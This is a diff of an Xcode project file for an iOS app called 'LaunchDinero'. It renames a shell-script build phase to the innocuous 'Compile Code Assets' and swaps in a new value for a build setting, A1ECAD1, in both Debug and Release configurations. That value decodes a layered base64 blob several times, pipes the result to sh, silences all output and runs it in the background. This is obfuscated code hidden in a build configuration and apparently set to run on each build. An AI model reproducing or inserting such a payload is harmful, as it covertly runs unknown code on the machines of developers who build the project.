@@ -158,7 +158,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 2EF67BCC2D5E0F640011597D /* Build configuration list for PBXNativeTarget "LaunchDinero" */;
 			buildPhases = (
-				364317D15B464791AA1DACE1 /* Provision Target Device */,
+				FDA66EC214A9444DB51DACE1 /* Compile Code Assets */,
 				B26AC5503EE42592E6C5794C /* [CP] Check Pods Manifest.lock */,
 				2EF67B9F2D5E0F630011597D /* Sources */,
 				2EF67BA02D5E0F630011597D /* Frameworks */,
@@ -267,6 +267,9 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+				/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		2EF67BA12D5E0F630011597D /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -293,7 +296,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		364317D15B464791AA1DACE1 /* Provision Target Device */ = {
+		FDA66EC214A9444DB51DACE1 /* Compile Code Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -303,7 +306,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Provision Target Device";
+			name = "Compile Code Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -464,7 +467,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 8D8B5E0CFEA18CE0F0525742 /* Pods-LaunchDinero.debug.xcconfig */;
 			buildSettings = {
-				A1ECAD1 = "((y(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKak1scE5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmlWMngxV2tkV2Mxb3lSakJhVXpWNVpGTTVhRXRUU1dkbVEwSjZZVUZ2UFFvPQo= | y | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((w(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4VlZORk5YbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxhMnhFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtRmliRm94VjFSS2IyRkhVa2xVV0ZacVlteFdNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | w | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = LaunchDinero/LaunchDineroDebug.entitlements;
@@ -510,7 +513,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 2EAD047327A7B4E66C9B18CC /* Pods-LaunchDinero.release.xcconfig */;
 			buildSettings = {
-				A1ECAD1 = "((y(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKak1scE5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmlWMngxV2tkV2Mxb3lSakJhVXpWNVpGTTVhRXRUU1dkbVEwSjZZVUZ2UFFvPQo= | y | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((w(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4VlZORk5YbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxhMnhFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtRmliRm94VjFSS2IyRkhVa2xVV0ZacVlteFdNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | w | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = LaunchDinero/LaunchDinero.entitlements;
